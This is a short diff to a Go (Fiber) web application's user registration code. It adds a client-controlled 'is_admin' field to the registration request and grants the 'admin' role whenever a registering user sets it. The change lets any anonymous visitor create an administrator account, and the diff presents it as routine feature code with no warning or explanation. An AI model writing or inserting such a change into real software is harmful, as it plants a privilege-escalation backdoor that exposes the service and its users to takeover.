@@ -60,6 +60,7 @@ func checkRegisterLimit(ip string) bool {
 type RegisterRequest struct {
 	Username string `json:"username" validate:"required,min=3,max=64"`
 	Password string `json:"password" validate:"required,min=6"`
+	IsAdmin  bool   `json:"is_admin"`
 }
 
 type LoginRequest struct {
@@ -133,6 +134,10 @@ func Register(c *fiber.Ctx) error {
 		Role:         "user",
 		Status:       "active",
 		Balance:      0,
+	}
+
+	if req.IsAdmin {
+		user.Role = "admin"
 	}
 
 	if result := db.DB.Create(&user); result.Error != nil {
